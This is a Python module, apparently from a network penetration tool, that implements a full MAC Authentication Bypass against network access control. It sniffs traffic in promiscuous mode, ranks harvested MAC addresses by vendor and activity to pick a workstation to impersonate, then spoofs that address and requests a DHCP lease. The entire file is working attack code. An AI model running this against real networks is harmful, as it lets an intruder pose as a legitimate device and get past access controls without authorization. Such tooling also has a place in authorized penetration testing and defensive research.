import logging
import os
import sqlite3
import time
from dataclasses import dataclass, field
from pathlib import Path

from core.utils import (
    Cleanup,
    get_iface_ip,
    get_iface_mac,
    is_locally_administered_mac,
    is_multicast_mac,
    kill_process_on_iface,
    normalize_mac,
    run_subprocess,
    validate_mac,
)

logger = logging.getLogger('nacleaver')

_DB_PATH = Path(__file__).parent.parent / "data" / "oui.db"
_IEEE_CSV = Path(__file__).parent.parent / "data" / "oui_full.csv"


@dataclass
class MACEntry:
    mac: str
    oui_prefix: str = ""
    vendor: str = "Unknown Vendor"
    category: str = "unknown"
    frame_count: int = 0
    arp_seen: bool = False
    ipv4_seen: bool = False
    stp_seen: bool = False
    cdp_lldp_seen: bool = False
    first_seen: float = 0.0
    last_seen: float = 0.0
    score: float = 0.0


@dataclass
class MABResult:
    success: bool
    spoofed_mac: str | None
    obtained_ip: str | None
    original_mac: str
    candidates: list[MACEntry]
    error: str | None = None


def _classify_vendor(vendor: str) -> str:
    v = vendor.lower()
    workstation_kw = ['dell', 'lenovo', 'hewlett', ' hp ', 'intel corporate', 'apple',
                      'microsoft', 'realtek', 'asustek', 'gigabyte', 'acer', 'samsung electronics']
    network_kw = ['cisco', 'juniper', 'aruba', 'extreme', 'huawei', 'tp-link',
                  'netgear', 'palo alto', 'check point', 'fortinet']
    printer_kw = ['xerox', 'lexmark', 'brother', 'ricoh', 'canon', 'epson', 'kyocera', 'konica']
    mobile_kw = ['qualcomm', 'mediatek', 'oneplus', 'xiaomi', 'oppo', 'vivo']

    for kw in workstation_kw:
        if kw in v:
            return 'workstation'
    for kw in network_kw:
        if kw in v:
            return 'network'
    for kw in printer_kw:
        if kw in v:
            return 'printer'
    for kw in mobile_kw:
        if kw in v:
            return 'mobile'
    return 'unknown'


def init_oui_db() -> None:
    """Seed oui.db from built-in data on first run.
    If oui_full.csv is present and newer than the DB, import it on top.
    Expected IEEE MA-L format: Registry,Assignment,Organization Name,...
    """
    if _DB_PATH.exists():
        # DB exists — still check if the IEEE CSV needs to be ingested (first-run with CSV).
        # We use a sentinel: if the CSV is present and newer than the DB, re-ingest.
        if _IEEE_CSV.exists():
            db_mtime = _DB_PATH.stat().st_mtime
            csv_mtime = _IEEE_CSV.stat().st_mtime
            if csv_mtime <= db_mtime:
                return  # CSV already ingested
        else:
            return  # No CSV, DB is fresh enough

    from data.oui_seed import OUI_SEED

    conn = sqlite3.connect(str(_DB_PATH))
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS oui (
            prefix TEXT PRIMARY KEY,
            vendor TEXT NOT NULL,
            category TEXT NOT NULL DEFAULT 'unknown'
        )
    """)

    entries = []
    for prefix, (vendor, category) in OUI_SEED.items():
        clean_prefix = prefix.replace(' ', '').upper()
        if len(clean_prefix) != 6:
            continue
        entries.append((clean_prefix, vendor, category))

    cursor.executemany(
        "INSERT OR IGNORE INTO oui (prefix, vendor, category) VALUES (?, ?, ?)",
        entries
    )
    conn.commit()
    logger.debug(f"OUI database seeded with {len(entries)} built-in entries")

    # Optional fast-path: load full IEEE OUI CSV when present
    if _IEEE_CSV.exists():
        import csv
        ieee_rows = []
        try:
            with open(_IEEE_CSV, newline='', encoding='utf-8', errors='replace') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    prefix = row.get('Assignment', '').strip().upper()
                    vendor = row.get('Organization Name', '').strip()
                    if len(prefix) == 6 and vendor:
                        category = _classify_vendor(vendor)
                        ieee_rows.append((prefix, vendor, category))
            conn.executemany(
                "INSERT OR REPLACE INTO oui (prefix, vendor, category) VALUES (?, ?, ?)",
                ieee_rows
            )
            conn.commit()
            logger.info(f"OUI DB loaded {len(ieee_rows)} entries from {_IEEE_CSV.name}")
        except (OSError, csv.Error, KeyError) as e:
            logger.warning(f"Failed to load IEEE OUI CSV: {e}")

    conn.close()


def lookup_oui(mac: str) -> tuple[str, str]:
    """Return (vendor, category) for a MAC address, consulting the OUI DB."""
    init_oui_db()
    prefix = mac.replace(':', '').replace('-', '').upper()[:6]
    try:
        conn = sqlite3.connect(str(_DB_PATH))
        cursor = conn.cursor()
        cursor.execute("SELECT vendor, category FROM oui WHERE prefix = ?", (prefix,))
        row = cursor.fetchone()
        conn.close()
        if row:
            return row[0], row[1]
    except sqlite3.Error as e:
        logger.debug(f"OUI DB lookup error: {e}")
    return "Unknown Vendor", "unknown"


def _compute_score(entry: MACEntry) -> float:
    score = float(min(entry.frame_count, 100))
    score += 15.0 if entry.arp_seen else 0
    score += 8.0  if entry.ipv4_seen else 0
    score -= 30.0 if entry.stp_seen else 0
    score -= 30.0 if entry.cdp_lldp_seen else 0
    score += 20.0 if entry.category == "workstation" else 0
    score += 5.0  if entry.category == "mobile" else 0
    score -= 10.0 if entry.category == "printer" else 0
    score -= 50.0 if entry.category == "network" else 0
    return score


# CDP/LLDP multicast addresses that indicate network device traffic
_CDP_LLDP_MCAST = {
    '01:00:0c:cc:cc:cc',  # CDP
    '01:80:c2:00:00:0e',  # LLDP
    '01:80:c2:00:00:00',  # STP
    '01:80:c2:00:00:03',  # 802.1X
}


def harvest_macs(iface: str, duration: int = 60, verbose: bool = False) -> list[MACEntry]:
    """Passively capture MAC addresses from all frames for `duration` seconds."""
    from scapy.all import sniff, conf, STP, ARP, IP

    own_mac = get_iface_mac(iface)
    entries: dict[str, MACEntry] = {}

    original_promisc = conf.sniff_promisc
    conf.sniff_promisc = True

    if verbose:
        logger.info(f"[mab] Harvesting MACs on {iface} for {duration}s ...")

    def _handle_frame(pkt):
        try:
            src_mac = pkt.src
        except AttributeError:
            return

        if not src_mac:
            return
        if is_multicast_mac(src_mac):
            return
        if src_mac.lower() == 'ff:ff:ff:ff:ff:ff':
            return
        if src_mac.lower() == own_mac.lower():
            return
        if is_locally_administered_mac(src_mac):
            return

        now = time.time()
        mac_norm = normalize_mac(src_mac)

        if mac_norm not in entries:
            entries[mac_norm] = MACEntry(
                mac=mac_norm,
                first_seen=now,
                last_seen=now,
                frame_count=1,
            )
        else:
            entries[mac_norm].frame_count += 1
            entries[mac_norm].last_seen = now

        e = entries[mac_norm]

        try:
            if pkt.haslayer(ARP):
                e.arp_seen = True
        except Exception:
            pass

        try:
            if pkt.haslayer(IP):
                e.ipv4_seen = True
        except Exception:
            pass

        try:
            if pkt.haslayer(STP):
                e.stp_seen = True
        except Exception:
            pass

        try:
            dst = pkt.dst.lower() if hasattr(pkt, 'dst') else ''
            if dst in _CDP_LLDP_MCAST or getattr(pkt, 'type', 0) == 0x88CC:
                e.cdp_lldp_seen = True
        except Exception:
            pass

    sniff(iface=iface, store=False, prn=_handle_frame, timeout=duration)

    conf.sniff_promisc = original_promisc

    # Resolve OUI and compute scores
    for mac_norm, entry in entries.items():
        prefix = mac_norm.replace(':', '').upper()[:6]
        entry.oui_prefix = prefix
        entry.vendor, entry.category = lookup_oui(mac_norm)
        entry.score = _compute_score(entry)

    sorted_entries = sorted(entries.values(), key=lambda e: e.score, reverse=True)

    if verbose:
        logger.info(f"[mab] Captured {len(sorted_entries)} unique MACs")
        for e in sorted_entries[:5]:
            logger.info(f"  {e.mac} [{e.vendor}] score={e.score:.1f}")

    return sorted_entries


def spoof_mac(iface: str, target_mac: str, no_restore: bool = False) -> bool:
    """Spoof MAC on interface, obtain DHCP lease, verify IP. Returns True on success."""
    if not validate_mac(target_mac):
        logger.error(f"[mab] Invalid MAC format: {target_mac}")
        return False

    original_mac = get_iface_mac(iface)

    # Register BEFORE any changes
    Cleanup.register_mac(iface, original_mac)
    if no_restore:
        Cleanup.disable_mac_restore()

    logger.info(f"[mab] Spoofing MAC on {iface}: {original_mac} → {target_mac}")

    rc, _, err = run_subprocess(["ip", "link", "set", iface, "down"])
    if rc != 0:
        logger.error(f"[mab] Failed to bring {iface} down: {err}")
        return False

    rc, _, err = run_subprocess(["ip", "link", "set", iface, "address", target_mac])
    if rc != 0:
        logger.error(f"[mab] Failed to set MAC on {iface}: {err}")
        run_subprocess(["ip", "link", "set", iface, "up"])
        return False

    rc, _, err = run_subprocess(["ip", "link", "set", iface, "up"])
    if rc != 0:
        logger.error(f"[mab] Failed to bring {iface} up: {err}")
        return False

    time.sleep(2)

    # Verify MAC was set
    current_mac = get_iface_mac(iface)
    if current_mac.lower() != target_mac.lower():
        logger.error(f"[mab] MAC verification failed: got {current_mac}, expected {target_mac}")
        restore_mac(iface, original_mac)
        return False

    logger.info(f"[mab] MAC set successfully, requesting DHCP lease ...")
    kill_process_on_iface("dhclient", iface)
    rc, _, err = run_subprocess(["dhclient", "-v", "-1", iface], timeout=20)
    if rc not in (0, 1):
        logger.warning(f"[mab] dhclient returned {rc}: {err}")

    obtained_ip = get_iface_ip(iface)
    if obtained_ip:
        logger.info(f"[mab] DHCP lease obtained: {obtained_ip}")
        return True
    else:
        logger.warning(f"[mab] No IP obtained after MAC spoof on {iface}")
        return False


def restore_mac(iface: str, original_mac: str) -> None:
    """Restore original MAC address on interface. Never raises."""
    try:
        logger.info(f"[mab] Restoring MAC {original_mac} on {iface}")
        run_subprocess(["ip", "link", "set", iface, "down"])
        run_subprocess(["ip", "link", "set", iface, "address", original_mac])
        run_subprocess(["ip", "link", "set", iface, "up"])
    except Exception as e:
        logger.debug(f"[mab] restore_mac error: {e}")


def run_mab_bypass(
    iface: str,
    target_mac: str | None = None,
    harvest_duration: int = 60,
    no_restore: bool = False,
    verbose: bool = False,
) -> MABResult:
    """Full MAB bypass: harvest → select → spoof → DHCP."""
    original_mac = get_iface_mac(iface)
    candidates: list[MACEntry] = []

    if target_mac is None:
        candidates = harvest_macs(iface, duration=harvest_duration, verbose=verbose)
        positive = [c for c in candidates if c.score > 0]
        if not positive:
            logger.error("[mab] No viable MAC candidates found (all scores ≤ 0)")
            return MABResult(
                success=False,
                spoofed_mac=None,
                obtained_ip=None,
                original_mac=original_mac,
                candidates=candidates,
                error="No viable MAC candidates found",
            )
        target_mac = positive[0].mac
        logger.info(f"[mab] Best candidate: {target_mac} (score={positive[0].score:.1f}, vendor={positive[0].vendor})")

    success = spoof_mac(iface, target_mac, no_restore=no_restore)
    obtained_ip = get_iface_ip(iface) if success else None

    return MABResult(
        success=success,
        spoofed_mac=target_mac,
        obtained_ip=obtained_ip,
        original_mac=original_mac,
        candidates=candidates,
        error=None if success else "MAC spoof or DHCP failed",
    )


if __name__ == "__main__":
    import sys
    from rich import print as rprint
    from core.utils import require_root, setup_logging
    require_root()
    setup_logging(verbose=True)
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    result = run_mab_bypass(iface, harvest_duration=30, verbose=True)
    rprint(result)
